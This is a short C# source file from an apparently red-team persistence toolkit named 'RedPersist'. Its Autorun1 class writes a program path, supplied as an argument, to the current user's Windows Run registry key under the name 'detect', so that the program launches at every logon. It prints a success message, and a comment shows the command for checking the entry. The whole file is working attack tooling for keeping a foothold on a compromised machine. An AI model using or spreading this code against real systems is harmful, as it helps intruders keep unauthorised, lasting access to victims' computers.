using Microsoft.Win32;
using System;
namespace RedPersist.Persist
{
    
    public class Autorun1
    {
        public static void Do(string[] args)
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
            key.SetValue("detect", args[1]);
            key.Close();
            Console.WriteLine("[*] Startup Persistence created");
            //  reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s

        }
    }
}
